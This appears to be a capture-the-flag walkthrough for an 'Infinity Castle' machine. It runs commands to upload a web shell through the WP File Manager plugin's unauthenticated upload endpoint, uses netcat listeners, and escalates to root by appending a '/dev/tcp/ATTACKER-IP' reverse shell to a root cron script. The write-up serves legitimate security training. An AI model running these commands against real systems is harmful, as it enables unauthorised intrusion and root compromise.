# 🏯 Infinity Castle — Walkthrough

## 🔎 Enumeration

### Nmap Scan

```bash
 nmap -sC -sV -p- TARGET-IP
```

### Findings

* Port 80 (HTTP) open
* WordPress website detected

---

## 🌐 Web Enumeration

### Directory Brute Force

```bash
 gobuster dir -u http://TARGET-IP -w /usr/share/wordlists/dirb/common.txt
```

### Key Discovery

```text
 /wordpress/
```

---

## 🔥 Exploitation — WordPress Plugin

The **WP File Manager plugin** is vulnerable to unauthenticated file upload.

### Vulnerable Endpoint

```text
 /wordpress/wp-content/plugins/wp-file-manager/lib/php/connector.minimal.php
```

---

### Upload Reverse Shell

```bash
 curl -F "upload[]=@shell.php" \
 -F "action=upload" \
 -F "target=l1_Lw" \
 http://TARGET-IP/wordpress/wp-content/plugins/wp-file-manager/lib/php/connector.minimal.php
```

---

## 🐚 Reverse Shell Access

### Start Listener

```bash
 nc -lvnp 4444
```

### Trigger Shell

```text
 http://TARGET-IP/wordpress/wp-content/plugins/wp-file-manager/lib/files/shell.php
```

---

## 🧠 Stabilize Shell

```bash
 python3 -c 'import pty; pty.spawn("/bin/bash")'
 export TERM=xterm
```

---

## 🔍 Enumeration (Post Exploitation)

### Check Cron Jobs

```bash
 cat /etc/crontab
```

### Discovery

```text
 /opt/backup/backup.sh (runs as root)
```

---

## ⚠️ Privilege Escalation

### Edit Script

```bash
 nano /opt/backup/backup.sh
```

### Add Payload

```bash
 bash -i >& /dev/tcp/ATTACKER-IP/5555 0>&1
```

---

### Start Listener

```bash
 nc -lvnp 5555
```

Wait for cron execution.

---

## 👑 Root Access

Once triggered:

```text
 root@machine:~#
```

---

## 🏁 Capture Flag

```bash
 cat /root/root_flag.txt
```

---

## 🎯 Attack Summary

```text
  Web Enumeration → WordPress → File Upload → Reverse Shell → Cron Exploit → Root
```

---

## 📌 Key Takeaways

* Unauthenticated upload vulnerabilities are critical
* Misconfigured cron jobs can lead to full compromise
* Defense in depth is essential

---

## ⚠️ Disclaimer

This walkthrough is for educational purposes only.

